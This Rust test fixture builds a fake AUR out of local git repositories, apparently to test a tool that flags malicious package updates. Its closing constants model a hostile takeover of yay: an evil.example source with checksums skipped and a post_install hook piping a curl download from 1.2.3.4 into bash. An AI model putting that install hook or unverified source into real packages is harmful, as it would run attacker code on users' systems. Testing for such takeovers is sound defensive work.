//! A fake AUR: bare git repositories under one directory, served with a
//! `file://` base, plus helpers to add commits.

use std::path::{Path, PathBuf};
use std::process::Command;

pub struct FakeAur {
    pub dir: PathBuf,
}

impl FakeAur {
    pub fn new(root: &Path) -> FakeAur {
        let dir = root.join("aur");
        std::fs::create_dir_all(&dir).unwrap();
        FakeAur { dir }
    }

    /// The `PACVAMP_AUR_GIT_BASE` value.
    pub fn base(&self) -> String {
        format!("file://{}", self.dir.display())
    }

    fn git(args: &[&str], cwd: &Path, date: &str) {
        let out = Command::new("git")
            .args(args)
            .current_dir(cwd)
            .env("GIT_AUTHOR_NAME", "Alice")
            .env("GIT_AUTHOR_EMAIL", "alice@example.com")
            .env("GIT_COMMITTER_NAME", "Alice")
            .env("GIT_COMMITTER_EMAIL", "alice@example.com")
            .env("GIT_AUTHOR_DATE", date)
            .env("GIT_COMMITTER_DATE", date)
            .output()
            .unwrap();
        assert!(
            out.status.success(),
            "git {args:?}: {}",
            String::from_utf8_lossy(&out.stderr)
        );
    }

    fn work(&self, pkgbase: &str) -> PathBuf {
        self.dir.join(format!("{pkgbase}.work"))
    }

    /// Create `pkgbase` with one commit containing `files`.
    pub fn create(&self, pkgbase: &str, files: &[(&str, &str)], date: &str) {
        let work = self.work(pkgbase);
        std::fs::create_dir_all(&work).unwrap();
        Self::git(&["init", "--quiet", "-b", "master"], &work, date);
        for (name, content) in files {
            std::fs::write(work.join(name), content).unwrap();
        }
        Self::git(&["add", "."], &work, date);
        Self::git(&["commit", "--quiet", "-m", "initial"], &work, date);
        let bare = self.dir.join(format!("{pkgbase}.git"));
        Self::git(
            &[
                "clone",
                "--quiet",
                "--bare",
                work.to_str().unwrap(),
                bare.to_str().unwrap(),
            ],
            &self.dir,
            date,
        );
    }

    /// Add a commit to `pkgbase` and push it to the bare repository.
    pub fn commit(&self, pkgbase: &str, files: &[(&str, &str)], message: &str, date: &str) {
        let work = self.work(pkgbase);
        for (name, content) in files {
            std::fs::write(work.join(name), content).unwrap();
        }
        Self::git(&["add", "."], &work, date);
        Self::git(&["commit", "--quiet", "-m", message], &work, date);
        let bare = self.dir.join(format!("{pkgbase}.git"));
        Self::git(
            &["push", "--quiet", bare.to_str().unwrap(), "master:master"],
            &work,
            date,
        );
    }

    /// The current head of `pkgbase`.
    pub fn head(&self, pkgbase: &str) -> String {
        let out = Command::new("git")
            .args(["rev-parse", "HEAD"])
            .current_dir(self.work(pkgbase))
            .output()
            .unwrap();
        String::from_utf8_lossy(&out.stdout).trim().to_string()
    }
}

/// A benign yay-shaped recipe.
pub const YAY_PKGBUILD: &str = "# Maintainer: jguer\npkgname=yay\npkgver=13.0.1\npkgrel=1\nsource=(\"yay-13.0.1.tar.gz::https://github.com/Jguer/yay/archive/v13.0.1.tar.gz\")\nsha256sums=('b77454bce87110180a1b6664c2d260de78124c9894b71101610ba84f551eb0d0')\nbuild() {\n  make build\n}\npackage() {\n  make DESTDIR=\"$pkgdir\" install\n}\n";
pub const YAY_SRCINFO: &str = "pkgbase = yay\n\tpkgver = 13.0.1\n\tpkgrel = 1\n\tarch = x86_64\n\tsource = yay-13.0.1.tar.gz::https://github.com/Jguer/yay/archive/v13.0.1.tar.gz\n\tsha256sums = b77454bce87110180a1b6664c2d260de78124c9894b71101610ba84f551eb0d0\n\npkgname = yay\n";

/// The same package after a hostile takeover.
pub const EVIL_PKGBUILD: &str = "# Maintainer: mallory\npkgname=yay\npkgver=13.0.2\npkgrel=1\ninstall=yay.install\nsource=(\"https://evil.example/yay.tar.gz\")\nsha256sums=('SKIP')\nbuild() {\n  npm install atomic-lockfile\n  make build\n}\npackage() {\n  make DESTDIR=\"$pkgdir\" install\n}\n";
pub const EVIL_SRCINFO: &str = "pkgbase = yay\n\tpkgver = 13.0.2\n\tpkgrel = 1\n\tinstall = yay.install\n\tarch = x86_64\n\tsource = https://evil.example/yay.tar.gz\n\tsha256sums = SKIP\n\npkgname = yay\n";
pub const EVIL_INSTALL: &str = "post_install() {\n  curl -fsSL https://1.2.3.4/x.sh | bash\n}\n";
